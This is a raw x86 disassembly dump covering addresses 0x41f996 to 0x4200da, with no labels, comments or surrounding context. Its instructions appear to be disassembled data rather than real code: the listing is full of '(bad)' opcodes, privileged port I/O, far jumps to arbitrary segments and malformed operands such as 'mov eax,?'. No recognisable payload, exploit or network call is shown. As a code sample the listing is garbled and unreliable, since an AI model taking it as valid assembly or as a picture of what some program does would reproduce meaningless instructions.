  41f996:	sub    edx,ebp
  41f998:	mov    ch,0xba
  41f99a:	cmp    dh,ah
  41f99c:	inc    ebx
  41f99d:	sbb    bh,BYTE PTR [eax]
  41f99f:	nop
  41f9a0:	outs   dx,BYTE PTR ds:[esi]
  41f9a1:	xlat   BYTE PTR ds:[bx]
  41f9a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f9a4:	xchg   edi,eax
  41f9a5:	out    dx,eax
  41f9a6:	in     eax,0xca
  41f9a8:	mov    dl,ch
  41f9aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f9ab:	dec    esp
  41f9ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f9ad:	popa   
  41f9ae:	and    ecx,DWORD PTR [esi+0x42697881]
  41f9b4:	inc    edi
  41f9b6:	mov    esp,0xa098b088
  41f9bb:	scas   eax,DWORD PTR es:[edi]
  41f9bc:	call   0xdf61e201
  41f9c1:	push   esp
  41f9c2:	ret    
  41f9c3:	into   
  41f9c4:	sbb    ebx,0xffffffbe
  41f9c7:	repz sub DWORD PTR [ebx],esp
  41f9ca:	add    BYTE PTR [edi+0x2b6bdaa8],0x3c
  41f9d1:	mov    edx,0xc40906a8
  41f9d6:	imul   ebx,DWORD PTR [esi+0x7d63e9b0],0xffffffba
  41f9dd:	retf   0x5d2f
  41f9e0:	fisubr WORD PTR [eax+0x5dbfd711]
  41f9e6:	sbb    dh,0x65
  41f9e9:	js     0x41f978
  41f9eb:	pop    edx
  41f9ec:	test   DWORD PTR ds:0x745832ba,edx
  41f9f2:	enter  0x4ce1,0x56
  41f9f6:	rcr    BYTE PTR [ebp+ecx*4-0x42713dd9],1
  41f9fd:	xor    ebx,DWORD PTR [eax]
  41f9ff:	cmp    edx,ebx
  41fa01:	jb     0x41fa4e
  41fa03:	add    BYTE PTR [ebx-0x3f],0x7f
  41fa07:	push   esp
  41fa08:	loope  0x41fa2f
  41fa0a:	adc    BYTE PTR [eax+0x15dbade2],bl
  41fa10:	and    BYTE PTR [edi-0x17],ch
  41fa13:	scas   al,BYTE PTR es:[edi]
  41fa14:	xor    ebp,DWORD PTR [ecx-0x3925ddea]
  41fa1a:	pop    esi
  41fa1b:	xchg   edx,eax
  41fa1c:	js     0x41fa6b
  41fa1e:	imul   edi,ebx,0xffffffd9
  41fa21:	dec    eax
  41fa22:	inc    ebx
  41fa23:	or     edx,esi
  41fa25:	cmp    BYTE PTR [ebp+0x66b8df94],dh
  41fa2b:	enter  0x490d,0x7d
  41fa2f:	xor    bh,cl
  41fa31:	fadd   st,st(6)
  41fa33:	pusha  
  41fa34:	xchg   DWORD PTR [ecx],ebx
  41fa36:	jnp    0x41fa60
  41fa38:	test   BYTE PTR [ecx],bl
  41fa3a:	mov    bl,0xf3
  41fa3c:	xlat   BYTE PTR ds:[ebx]
  41fa3d:	out    0x74,al
  41fa3f:	in     eax,dx
  41fa40:	aad    0xd
  41fa42:	sbb    al,0xbc
  41fa44:	adc    ebp,DWORD PTR [eax-0x7b]
  41fa47:	adc    eax,0x1b4b494f
  41fa4c:	bound  ebx,QWORD PTR [esi]
  41fa4e:	scas   al,BYTE PTR es:[edi]
  41fa4f:	mov    bl,0xab
  41fa51:	scas   eax,DWORD PTR es:[edi]
  41fa52:	mov    dl,0x2d
  41fa54:	rcr    eax,1
  41fa56:	inc    ebp
  41fa57:	dec    ebx
  41fa58:	scas   eax,DWORD PTR es:[edi]
  41fa59:	mov    dh,0x86
  41fa5b:	das    
  41fa5c:	cdq    
  41fa5d:	mov    bl,0xb6
  41fa5f:	test   BYTE PTR [eax-0x34f15dcd],bl
  41fa65:	outs   dx,BYTE PTR ds:[esi]
  41fa66:	jecxz  0x41fa50
  41fa68:	jle    0x41fa09
  41fa6a:	call   0x81786746
  41fa6f:	out    dx,al
  41fa70:	jo     0x41fa00
  41fa72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa73:	mov    edi,0x44bb62ef
  41fa78:	and    al,0xeb
  41fa7a:	xor    eax,0x542620cd
  41fa7f:	push   esi
  41fa80:	into   
  41fa81:	mov    edx,0xa825855b
  41fa86:	lds    ebp,FWORD PTR [edx]
  41fa88:	jae    0x41fa77
  41fa8a:	je     0x41fa6f
  41fa8c:	add    dh,dl
  41fa8e:	mov    edx,0xdbd916e7
  41fa93:	xor    eax,0x7a18398d
  41fa98:	adc    cl,BYTE PTR [ecx+0x5d]
  41fa9b:	int3   
  41fa9c:	push   cs
  41fa9d:	pop    esp
  41fa9e:	pop    ebx
  41fa9f:	scas   al,BYTE PTR es:[edi]
  41faa0:	xchg   ecx,eax
  41faa1:	out    0x90,al
  41faa3:	inc    ch
  41faa5:	pop    ds
  41faa6:	and    ah,ah
  41faa8:	pop    ss
  41faa9:	addr16 pop es
  41faab:	adc    eax,0x63a9a32b
  41fab0:	push   es
  41fab1:	icebp  
  41fab2:	and    DWORD PTR [edi-0x1c891767],edx
  41fab8:	sti    
  41fab9:	iret   
  41faba:	jge    0x41fa97
  41fabc:	in     eax,dx
  41fabd:	push   cs
  41fabe:	lahf   
  41fabf:	cmp    eax,0x2255ca48
  41fac4:	and    dh,BYTE PTR [esi]
  41fac6:	ja     0x41fb10
  41fac8:	inc    ebx
  41fac9:	sbb    BYTE PTR [ebp-0x65],bl
  41facc:	(bad)  
  41facd:	mov    dh,0xb4
  41facf:	and    DWORD PTR [esi],esp
  41fad1:	xchg   edi,eax
  41fad2:	(bad)  
  41fad3:	or     ecx,ecx
  41fad5:	pop    esi
  41fad6:	push   ebp
  41fad7:	jp     0x2cd857fd
  41fadd:	or     esp,DWORD PTR [eax+edi*8+0x37]
  41fae1:	push   ds
  41fae2:	mov    ah,BYTE PTR [edx]
  41fae4:	mov    edx,0x29e53273
  41fae9:	pop    esi
  41faea:	cmp    al,0xaa
  41faec:	fsubr  st(5),st
  41faee:	push   ebx
  41faef:	push   ecx
  41faf0:	es ret 0x9bf9
  41faf4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41faf5:	inc    edx
  41faf6:	cmp    dh,BYTE PTR [edx]
  41faf8:	pop    ebx
  41faf9:	scas   al,BYTE PTR es:[edi]
  41fafa:	xchg   edi,eax
  41fafb:	push   ss
  41fafc:	jmp    0x89d1:0x68ad2eed
  41fb03:	xor    DWORD PTR [edi-0x350f11fa],edx
  41fb09:	add    esi,DWORD PTR [edi+0x31]
  41fb0c:	cmp    ebp,edx
  41fb0e:	cld    
  41fb0f:	inc    esp
  41fb10:	pop    ecx
  41fb11:	and    eax,0xe4a561f6
  41fb16:	mov    DWORD PTR [esi],eax
  41fb18:	fdiv   QWORD PTR [ecx+eiz*4-0x4d]
  41fb1c:	sub    cl,dh
  41fb1e:	loop   0x41faca
  41fb20:	out    dx,eax
  41fb21:	sbb    ah,ah
  41fb23:	adc    esi,ecx
  41fb25:	scas   eax,DWORD PTR es:[edi]
  41fb26:	jecxz  0x41fadf
  41fb28:	shl    ch,1
  41fb2a:	fld    TBYTE PTR [ecx]
  41fb2c:	inc    eax
  41fb2d:	lods   al,BYTE PTR ds:[esi]
  41fb2e:	or     DWORD PTR ds:0xe08a7cb9,edx
  41fb34:	jne    0x41fb58
  41fb36:	cdq    
  41fb37:	push   ebx
  41fb38:	jo     0x41fb9e
  41fb3a:	adc    eax,0x1d07bfde
  41fb3f:	retf   
  41fb40:	push   edi
  41fb41:	jp     0x41fafa
  41fb43:	sbb    DWORD PTR [ecx-0xa811a3a],ebp
  41fb49:	cmp    eax,0xdf6e77dd
  41fb4f:	arpl   WORD PTR [edx+edi*2],cx
  41fb52:	push   ebp
  41fb53:	mov    bl,0x40
  41fb55:	pusha  
  41fb56:	and    eax,0x47cb519c
  41fb5b:	xchg   ah,ah
  41fb5d:	adc    eax,esp
  41fb5f:	dec    ebp
  41fb60:	mov    al,ds:0x552f35f6
  41fb65:	mov    dh,0x8f
  41fb67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fb68:	outs   dx,BYTE PTR ds:[esi]
  41fb69:	xchg   edx,eax
  41fb6a:	outs   dx,DWORD PTR ds:[esi]
  41fb6b:	dec    edx
  41fb6c:	pop    edx
  41fb6d:	in     al,0xa8
  41fb6f:	pop    ss
  41fb70:	jnp    0x41fb64
  41fb72:	lock adc cl,BYTE PTR [eax]
  41fb75:	pop    es
  41fb76:	or     BYTE PTR [ebx-0x64],bl
  41fb79:	aam    0x71
  41fb7b:	and    DWORD PTR [ebx-0x2c],eax
  41fb7e:	or     eax,0xc6244a74
  41fb83:	out    dx,eax
  41fb84:	imul   edx,DWORD PTR [esi-0x4],0x49
  41fb88:	loop   0x41fbe7
  41fb8a:	mov    ebx,0xac48fee0
  41fb8f:	imul   esi,DWORD PTR [edi-0x23aa0e08],0x23805316
  41fb99:	cmp    esp,DWORD PTR [edx+0x5fe76ec]
  41fb9f:	retf   0x172b
  41fba2:	pop    ds
  41fba3:	push   ebx
  41fba4:	adc    DWORD PTR [ebx+0x343b54a3],ebp
  41fbaa:	pop    esi
  41fbab:	sbb    DWORD PTR [ecx-0x25],ebp
  41fbae:	add    DWORD PTR [edi],ebp
  41fbb0:	(bad)  
  41fbb1:	sub    BYTE PTR [ecx-0x34],ch
  41fbb4:	arpl   WORD PTR [ebx+0x58],sp
  41fbb7:	jmp    0x5d9d:0xf487c922
  41fbbe:	imul   edx,DWORD PTR [eax],0xffffffee
  41fbc1:	mov    cl,0xc7
  41fbc3:	jbe    0x41fbf5
  41fbc5:	je     0x41fbb8
  41fbc7:	fidiv  DWORD PTR [eax-0x2c]
  41fbca:	cmp    BYTE PTR [edx],bl
  41fbcc:	(bad)  
  41fbcd:	out    dx,eax
  41fbce:	cmp    BYTE PTR [ebx],dh
  41fbd0:	clc    
  41fbd1:	dec    ecx
  41fbd2:	mov    al,0xce
  41fbd4:	out    dx,eax
  41fbd5:	fs add ch,0xd4
  41fbd9:	in     eax,0xc
  41fbdb:	pusha  
  41fbdc:	dec    edi
  41fbdd:	jge    0x41fb62
  41fbdf:	ret    0x9ae1
  41fbe2:	cli    
  41fbe3:	sub    DWORD PTR [edx-0x60d5eb3],esp
  41fbe9:	out    0xb4,eax
  41fbeb:	(bad)  
  41fbec:	mov    eax,?
  41fbee:	shl    DWORD PTR [edx+0x5eca85ef],cl
  41fbf4:	lock iret 
  41fbf6:	lods   eax,DWORD PTR ds:[esi]
  41fbf7:	lahf   
  41fbf8:	push   ebp
  41fbf9:	pop    esp
  41fbfa:	shr    BYTE PTR [eax+0x6b065499],0xf4
  41fc01:	dec    edi
  41fc02:	add    edx,ebp
  41fc04:	mov    ds:0x784fe8d2,al
  41fc09:	xchg   ebp,eax
  41fc0a:	jmp    0x6d2b:0xe0fc7710
  41fc11:	push   eax
  41fc12:	or     BYTE PTR [ecx+0x40],bh
  41fc15:	pop    esp
  41fc16:	adc    BYTE PTR [ebp+0x3c6c8ea2],cl
  41fc1c:	shl    DWORD PTR [edi],0xc0
  41fc1f:	fdivr  DWORD PTR [edi-0x4f]
  41fc22:	cmp    al,0x89
  41fc24:	loopne 0x41fbf7
  41fc26:	jmp    0x72d4e515
  41fc2b:	mov    dh,0xab
  41fc2d:	xchg   al,ch
  41fc2f:	or     dh,BYTE PTR [edi]
  41fc31:	(bad)  
  41fc32:	xchg   ecx,eax
  41fc33:	dec    esp
  41fc34:	adc    ebx,DWORD PTR [edi-0x599f68a2]
  41fc3a:	pop    ds
  41fc3b:	loope  0x41fbe2
  41fc3d:	inc    ebx
  41fc3e:	into   
  41fc3f:	(bad)  
  41fc40:	arpl   WORD PTR cs:[ecx+ecx*8+0x53df1171],si
  41fc48:	js     0x41fc76
  41fc4a:	sub    eax,0xee129546
  41fc4f:	pop    ebx
  41fc50:	ds call 0x46e89204
  41fc56:	(bad)  
  41fc57:	(bad)  [edx+0x1a842d09]
  41fc5d:	lds    esp,FWORD PTR [ecx]
  41fc5f:	cmp    al,0x7d
  41fc61:	in     eax,dx
  41fc62:	mov    dh,0x8a
  41fc64:	cmp    BYTE PTR gs:[eax+eiz*4+0x42e9398a],ch
  41fc6c:	scas   eax,DWORD PTR es:[edi]
  41fc6d:	int    0x76
  41fc6f:	xchg   DWORD PTR [edi-0x21],edx
  41fc72:	icebp  
  41fc73:	out    dx,eax
  41fc74:	bound  edi,QWORD PTR [edx+0x77d0206b]
  41fc7a:	out    0xe,eax
  41fc7c:	pusha  
  41fc7d:	sbb    ebx,DWORD PTR [ebp+0x169f305]
  41fc83:	pop    es
  41fc84:	dec    ebp
  41fc85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fc86:	std    
  41fc87:	jbe    0x41fc46
  41fc89:	mov    al,ds:0x24bc2b8e
  41fc8e:	sbb    bl,BYTE PTR [edx]
  41fc90:	and    BYTE PTR [ecx+0x67],0x85
  41fc94:	rcr    bh,cl
  41fc96:	les    ecx,FWORD PTR [eax-0x30215826]
  41fc9c:	rol    DWORD PTR [edx-0x35],cl
  41fc9f:	loopne 0x41fcc2
  41fca1:	mov    ch,0x1f
  41fca3:	dec    ebp
  41fca4:	imul   edi,DWORD PTR [edi],0xffffff9a
  41fca7:	mov    edi,cs
  41fca9:	adc    ch,BYTE PTR [edx+0x78]
  41fcac:	scas   al,BYTE PTR es:[edi]
  41fcad:	int    0xff
  41fcaf:	sbb    eax,0x648438d8
  41fcb4:	aam    0x97
  41fcb6:	sub    esp,DWORD PTR [ecx+0x74]
  41fcb9:	data16 cmp dl,bl
  41fcbc:	mov    ecx,esp
  41fcbe:	retf   
  41fcbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fcc0:	test   eax,0x5c1b4713
  41fcc5:	mov    bh,0x9c
  41fcc7:	sub    ebp,ecx
  41fcc9:	clc    
  41fcca:	xchg   BYTE PTR [ebx-0x38],cl
  41fccd:	imul   ebx,DWORD PTR [esi],0x7d
  41fcd0:	ds jl  0x41fcd8
  41fcd3:	nop
  41fcd4:	mov    DWORD PTR [edi+edi*8-0x65],ecx
  41fcd8:	inc    eax
  41fcd9:	loop   0x41fc7c
  41fcdb:	add    bl,BYTE PTR [eax-0x10428ddf]
  41fce1:	adc    DWORD PTR [ebx+0x18f5eb56],esp
  41fce7:	or     eax,0x11f05e99
  41fcec:	call   0x79b24ea6
  41fcf1:	ds push edx
  41fcf3:	repz iret 
  41fcf5:	and    ch,BYTE PTR [ebx-0x76]
  41fcf8:	test   BYTE PTR [edx+0x3073b121],al
  41fcfe:	xchg   DWORD PTR ds:0x1f4be651,esp
  41fd04:	inc    ebp
  41fd05:	jnp    0x41fd21
  41fd07:	dec    edx
  41fd08:	xor    DWORD PTR [edx+0x45b538b3],ebx
  41fd0e:	cmp    ebp,0xb92211bb
  41fd14:	add    edx,esi
  41fd16:	(bad)  
  41fd17:	pop    edi
  41fd18:	add    DWORD PTR [eax+eiz*4],edi
  41fd1b:	sbb    eax,DWORD PTR [ecx]
  41fd1d:	lock or edi,esi
  41fd20:	adc    BYTE PTR [ebx+edx*4],ch
  41fd23:	test   al,0xec
  41fd25:	and    BYTE PTR [edx+edx*8],bh
  41fd28:	ret    0x2299
  41fd2b:	push   0xffffff8c
  41fd2d:	xlat   BYTE PTR ds:[ebx]
  41fd2e:	daa    
  41fd2f:	push   esp
  41fd30:	jo     0x41fcbb
  41fd32:	test   DWORD PTR [ebp+0x66650eea],ebp
  41fd38:	pop    ss
  41fd39:	cs pusha 
  41fd3b:	add    ch,ch
  41fd3d:	mov    al,ds:0x0
  41fd42:	mov    ds:0xb713b617,al
  41fd47:	mov    bl,0xa7
  41fd49:	mov    bh,0xb
  41fd4b:	add    BYTE PTR [edi+0x176180dc],dh
  41fd51:	(bad)  
  41fd52:	in     eax,dx
  41fd53:	ja     0x41fd56
  41fd55:	add    ah,dh
  41fd57:	add    al,0x0
  41fd59:	add    cl,bl
  41fd5b:	idiv   DWORD PTR [edx-0x1abb1277]
  41fd61:	popa   
  41fd62:	cmp    al,bh
  41fd64:	add    bl,BYTE PTR [edi-0xf]
  41fd67:	adc    cl,BYTE PTR [ecx-0x20]
  41fd6a:	pop    ss
  41fd6b:	adc    eax,0x6c9413ae
  41fd70:	pop    esi
  41fd71:	push   ecx
  41fd72:	imul   edx,DWORD PTR [eax],0x19
  41fd75:	cld    
  41fd76:	std    
  41fd77:	push   esi
  41fd78:	stos   DWORD PTR es:[edi],eax
  41fd79:	ret    
  41fd7a:	push   edx
  41fd7b:	dec    edx
  41fd7c:	sub    al,0x2c
  41fd7e:	mov    eax,0xcf22d6a5
  41fd83:	mov    esi,0x8efc1cf
  41fd88:	push   es
  41fd89:	out    0xef,eax
  41fd8b:	adc    al,ch
  41fd8d:	inc    ebx
  41fd8e:	cmp    cl,BYTE PTR [ebp+eax*2-0x1207571]
  41fd95:	push   edx
  41fd96:	sub    eax,0xa0fc706c
  41fd9b:	pop    eax
  41fd9c:	cmp    DWORD PTR [ebx],edi
  41fd9e:	mov    al,ds:0xfb8a2a2f
  41fda3:	mov    dl,0x6c
  41fda5:	sbb    DWORD PTR [edx-0x5dac3d05],0xffffffd7
  41fdac:	lds    ebp,FWORD PTR [edx-0x65]
  41fdaf:	mov    ebp,0x7152580f
  41fdb4:	jmp    0xe1a3:0x88bd04f9
  41fdbb:	adc    al,0x85
  41fdbd:	fsubrp st(1),st
  41fdbf:	in     al,0x55
  41fdc1:	retf   
  41fdc2:	sbb    al,0xb4
  41fdc4:	sub    al,0x27
  41fdc6:	cmp    BYTE PTR [ecx],bl
  41fdc8:	int    0x9a
  41fdca:	push   ds
  41fdcb:	sbb    al,0x28
  41fdcd:	or     ebx,ecx
  41fdcf:	cmp    eax,0x12ee75da
  41fdd4:	sub    eax,0xa84393a6
  41fdd9:	xlat   BYTE PTR ds:[ebx]
  41fdda:	shr    BYTE PTR [ebx-0x33102a6d],cl
  41fde0:	adc    BYTE PTR [edi],ah
  41fde2:	dec    edx
  41fde3:	mov    esp,0x6db61184
  41fde8:	jno    0x41fe40
  41fdea:	mov    ebx,0x39e01f08
  41fdef:	cwde   
  41fdf0:	retf   
  41fdf1:	cwde   
  41fdf2:	fmulp  st(1),st
  41fdf4:	leave  
  41fdf5:	rcr    BYTE PTR [esi],1
  41fdf7:	int    0x7d
  41fdf9:	jg     0x41fd9a
  41fdfb:	stos   DWORD PTR es:[edi],eax
  41fdfc:	stc    
  41fdfd:	sahf   
  41fdfe:	ret    0x1e6a
  41fe01:	ror    DWORD PTR ds:0x827bed54,0xb1
  41fe08:	pop    esi
  41fe09:	daa    
  41fe0a:	xchg   ecx,eax
  41fe0b:	inc    ecx
  41fe0c:	leave  
  41fe0d:	jp     0x41fe14
  41fe0f:	out    dx,eax
  41fe10:	or     bl,BYTE PTR [edx-0x7d]
  41fe13:	mov    ch,0x7d
  41fe15:	xchg   ecx,eax
  41fe16:	or     al,0x76
  41fe18:	xor    esp,eax
  41fe1a:	ja     0x41fe26
  41fe1c:	mov    dh,0x19
  41fe1e:	popa   
  41fe1f:	and    eax,0x70293848
  41fe24:	lock add al,0xde
  41fe27:	inc    ebp
  41fe28:	jbe    0x41fe5c
  41fe2a:	ds sbb ebp,ebx
  41fe2d:	dec    DWORD PTR [ebx+0x38d8ea02]
  41fe33:	jg     0x41fe37
  41fe35:	sahf   
  41fe36:	fist   DWORD PTR [edx+0x4c5b0715]
  41fe3c:	in     al,dx
  41fe3d:	int3   
  41fe3e:	in     al,0x87
  41fe40:	mov    esp,0x80f756df
  41fe45:	popa   
  41fe46:	push   eax
  41fe47:	les    ebx,FWORD PTR [ebx+0x70960f8d]
  41fe4d:	cdq    
  41fe4e:	sub    ebx,DWORD PTR [edi-0x7af8d075]
  41fe54:	je     0x41fe5f
  41fe56:	loopne 0x41fe3b
  41fe58:	cmp    bh,BYTE PTR [eax]
  41fe5a:	arpl   WORD PTR [ecx],bx
  41fe5c:	(bad)  
  41fe5d:	out    0x7,eax
  41fe5f:	sbb    ebp,DWORD PTR [ebx-0x146b3556]
  41fe65:	sub    BYTE PTR [ebx+0x6a],dh
  41fe68:	inc    esi
  41fe69:	popa   
  41fe6a:	ja     0x41fea9
  41fe6c:	or     eax,0xe2565f48
  41fe71:	jl     0x41fe0e
  41fe73:	jmp    0x52f0ebf0
  41fe78:	sar    cl,0xc5
  41fe7b:	(bad)  
  41fe7c:	fldenv [bx+di+0x43]
  41fe80:	ss das 
  41fe82:	sbb    bh,BYTE PTR [edi-0x114de6d3]
  41fe88:	je     0x41feec
  41fe8a:	dec    ecx
  41fe8b:	inc    ebx
  41fe8c:	fisub  WORD PTR [edi+eiz*2]
  41fe8f:	inc    esp
  41fe90:	push   edi
  41fe91:	into   
  41fe92:	jmp    0x41fe7f
  41fe94:	push   esi
  41fe95:	(bad)  
  41fe96:	pusha  
  41fe97:	fdiv   DWORD PTR [edi]
  41fe99:	cmp    eax,0x39e1409a
  41fe9e:	xor    DWORD PTR [ecx+0x16b35739],esp
  41fea4:	leave  
  41fea5:	fsubrp st(7),st
  41fea7:	jo     0x41fe4c
  41fea9:	lock mov bh,0xb2
  41feac:	fisubr DWORD PTR [edx-0x4d]
  41feaf:	adc    al,BYTE PTR [ecx+0x11]
  41feb2:	push   edx
  41feb3:	shr    DWORD PTR [ebp+0x12],0x1
  41feb7:	push   edx
  41feb8:	jmp    0x41ff1e
  41feba:	cmp    al,0x69
  41febc:	push   ebp
  41febd:	(bad)  
  41febe:	pop    ds
  41febf:	pop    esp
  41fec0:	and    DWORD PTR [esi],edi
  41fec2:	dec    edx
  41fec4:	out    0xa9,eax
  41fec6:	lods   al,BYTE PTR ds:[esi]
  41fec7:	sbb    ch,ah
  41fec9:	pusha  
  41feca:	inc    ebx
  41fecb:	ss inc esi
  41fecd:	mov    ds:0xa1708054,eax
  41fed2:	inc    esp
  41fed3:	std    
  41fed4:	or     eax,0x6016622e
  41fed9:	repnz adc BYTE PTR [esi+eax*8+0x2673fdd7],ch
  41fee1:	sub    eax,0x3469bd7e
  41fee6:	inc    edi
  41fee7:	sbb    eax,0xe25005dd
  41feec:	imul   edx,DWORD PTR [esi+0x62],0x469ef5a9
  41fef3:	aas    
  41fef4:	pop    ds
  41fef5:	leave  
  41fef6:	or     ah,BYTE PTR [eax]
  41fef8:	jg     0x41fe7d
  41fefa:	cmc    
  41fefb:	sub    DWORD PTR [edi],ecx
  41fefd:	in     eax,0xe2
  41feff:	(bad)  
  41ff00:	lahf   
  41ff01:	das    
  41ff02:	pop    ebx
  41ff03:	sti    
  41ff04:	in     al,0xa5
  41ff06:	gs (bad) 
  41ff08:	jecxz  0x41febd
  41ff0a:	xchg   edx,eax
  41ff0b:	sbb    eax,0xc2962497
  41ff10:	enter  0x3df3,0xf5
  41ff14:	mov    DWORD PTR [esi+0x22],edx
  41ff17:	inc    ebx
  41ff18:	adc    eax,0x81ab0431
  41ff1d:	fsubr  QWORD PTR [edi-0x50f47041]
  41ff23:	pushf  
  41ff24:	inc    ebp
  41ff25:	pop    esi
  41ff26:	pop    ds
  41ff27:	dec    ebx
  41ff28:	xor    eax,0x10d0cc36
  41ff2d:	add    eax,0x26ac3b52
  41ff32:	mov    bl,0x10
  41ff34:	mov    ebp,DWORD PTR [eax+edx*8-0x48fde1f4]
  41ff3b:	adc    al,0x38
  41ff3d:	loopne 0x41ff07
  41ff3f:	cmp    eax,0x89111924
  41ff44:	mov    al,ds:0xf7c8536c
  41ff49:	pop    es
  41ff4a:	(bad)  
  41ff4b:	sub    edi,DWORD PTR [eax]
  41ff4d:	sbb    al,bh
  41ff4f:	inc    ebx
  41ff50:	pop    eax
  41ff51:	push   esp
  41ff52:	nop
  41ff53:	test   al,0x7a
  41ff55:	ds push esp
  41ff57:	inc    ebp
  41ff58:	fwait
  41ff59:	popf   
  41ff5a:	inc    esp
  41ff5b:	(bad)  
  41ff5c:	push   edi
  41ff5d:	add    eax,0xaf14849f
  41ff62:	inc    eax
  41ff63:	mov    ebp,DWORD PTR [ebx+esi*8+0x14bece46]
  41ff6a:	pop    edx
  41ff6b:	jmp    0x67d68587
  41ff70:	xor    BYTE PTR [ebx+ecx*4+0x5b],bh
  41ff74:	fistp  WORD PTR [edi]
  41ff77:	repnz add BYTE PTR [ebp-0x75],dh
  41ff7b:	xor    dl,ch
  41ff7d:	sbb    eax,0x1f496781
  41ff82:	mov    eax,ebp
  41ff84:	push   esi
  41ff85:	minps  xmm0,XMMWORD PTR [edx]
  41ff88:	aas    
  41ff89:	out    dx,eax
  41ff8a:	jp     0x41ffc7
  41ff8c:	(bad)  
  41ff8d:	sbb    dh,BYTE PTR [eax+0x44]
  41ff90:	jne    0x41ffd0
  41ff92:	out    dx,al
  41ff93:	lahf   
  41ff94:	popf   
  41ff95:	(bad)  
  41ff96:	(bad)  
  41ff97:	fs repz aad 0xf
  41ff9b:	lea    edx,[ecx+ecx*1+0x59]
  41ff9f:	sub    BYTE PTR [edi+0x7d258b07],bl
  41ffa5:	mov    al,BYTE PTR [ecx+eiz*1]
  41ffa8:	clc    
  41ffa9:	and    eax,0xed61e0a5
  41ffae:	inc    edx
  41ffaf:	pusha  
  41ffb0:	mov    ecx,0x41957b7
  41ffb5:	out    dx,eax
  41ffb6:	aad    0xd
  41ffb8:	test   DWORD PTR [ebp-0xc],esp
  41ffbb:	cmp    eax,0xa1b2110b
  41ffc0:	add    DWORD PTR [eax+0x3e],0xffffffe5
  41ffc4:	jl     0x41ffcd
  41ffc6:	mov    al,0x8d
  41ffc8:	and    ah,dh
  41ffca:	xchg   BYTE PTR [ebx],ah
  41ffcc:	out    dx,al
  41ffcd:	stos   DWORD PTR es:[edi],eax
  41ffce:	add    DWORD PTR [esi+eiz*8],edx
  41ffd1:	fisub  WORD PTR [esi+0xeb755be]
  41ffd7:	mov    ecx,0xaf98a58f
  41ffdc:	loope  0x420054
  41ffde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ffdf:	pusha  
  41ffe0:	retf   0x2e0f
  41ffe3:	stos   DWORD PTR es:[edi],eax
  41ffe4:	stos   DWORD PTR es:[edi],eax
  41ffe5:	push   0xf77a4447
  41ffea:	sub    BYTE PTR [esi+0x19c8eea2],bl
  41fff0:	mov    ds:0x26db6a5,eax
  41fff5:	push   eax
  41fff6:	dec    esp
  41fff7:	not    DWORD PTR [ecx-0x3a]
  41fffa:	cwde   
  41fffb:	bound  esi,QWORD PTR [ebx+edi*1+0x21556a8a]
  420002:	test   BYTE PTR [ebx+0x58],ah
  420005:	sub    edi,DWORD PTR [edx+0x1d]
  420008:	aad    0x45
  42000a:	clc    
  42000b:	sti    
  42000c:	dec    ebp
  42000d:	loop   0x41ffa1
  42000f:	je     0x420070
  420011:	fwait
  420012:	mov    ecx,0x6b3c818b
  420017:	push   0xe23ddfc3
  42001c:	imul   edi,DWORD PTR [ebx+0x14],0xb2bf60a4
  420023:	fstp   DWORD PTR [eax]
  420025:	inc    ebx
  420026:	loope  0x42001b
  420028:	xchg   edx,eax
  420029:	push   ebp
  42002a:	jmp    0x41ffbf
  42002c:	cli    
  42002d:	lods   al,BYTE PTR ds:[esi]
  42002e:	cmp    cl,al
  420030:	stc    
  420031:	cdq    
  420032:	sub    DWORD PTR [edx+0x49],ecx
  420035:	iret   
  420036:	pop    edx
  420037:	retf   
  420038:	jecxz  0x42004d
  42003a:	jle    0x41ffc1
  42003c:	inc    ebp
  42003d:	call   0xe52b:0x63741571
  420044:	mov    ?,WORD PTR [edi-0x58]
  420047:	xchg   edx,eax
  420048:	adc    edi,DWORD PTR [ebx-0x6ba77973]
  42004e:	bound  eax,QWORD PTR [ecx-0x5b30937e]
  420054:	mov    ch,BYTE PTR [esi-0x1]
  420057:	or     edx,ebx
  420059:	jmp    0x42005c
  42005b:	xchg   esp,eax
  42005c:	ins    BYTE PTR es:[edi],dx
  42005d:	mov    gs,WORD PTR [ecx+0x2fca77f1]
  420063:	imul   edi,edx,0x18d25143
  420069:	call   0xbb80ba64
  42006e:	adc    DWORD PTR [ebp-0x56b912dd],0xffffff9b
  420075:	mov    al,ds:0x56854896
  42007a:	scas   al,BYTE PTR es:[edi]
  42007b:	fwait
  42007c:	outs   dx,DWORD PTR ds:[esi]
  42007d:	jne    0x4200cc
  42007f:	and    eax,0xa49ccbaa
  420084:	fisttp WORD PTR [ebx-0x5b6e56da]
  42008a:	stos   DWORD PTR es:[edi],eax
  42008b:	and    al,0x4d
  42008d:	cmc    
  42008e:	sbb    ch,BYTE PTR [ebp-0x7]
  420091:	pusha  
  420092:	inc    eax
  420093:	adc    bl,0xc6
  420096:	adc    ch,BYTE PTR [edx+0x26]
  420099:	dec    esp
  42009a:	stos   DWORD PTR es:[edi],eax
  42009b:	or     DWORD PTR [esi],0xffffff97
  42009e:	jno    0x4200b7
  4200a0:	inc    ebp
  4200a1:	fwait
  4200a2:	dec    esi
  4200a3:	in     eax,0x41
  4200a5:	and    BYTE PTR ds:0xc914bd35,0xcc
  4200ac:	shr    BYTE PTR [edi-0x4a4adcbc],1
  4200b2:	inc    eax
  4200b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4200b4:	add    al,0x29
  4200b6:	cmp    BYTE PTR [bx],al
  4200b9:	popf   
  4200ba:	push   ds
  4200bb:	jecxz  0x420085
  4200bd:	int3   
  4200be:	(bad)  
  4200bf:	int    0x32
  4200c1:	push   esi
  4200c2:	jmp    0x1da4:0x6c2758b7
  4200c9:	xor    BYTE PTR [esi+0x58],0xb9
  4200cd:	jno    0x4200f1
  4200cf:	jl     0x420138
  4200d1:	jae    0x420063
  4200d3:	bound  eax,QWORD PTR [esi]
  4200d5:	xchg   esi,eax
  4200d6:	les    ebx,FWORD PTR [edi+0x28]
  4200d9:	pop    es
  4200da:	stos   DWORD PTR es:[edi],eax
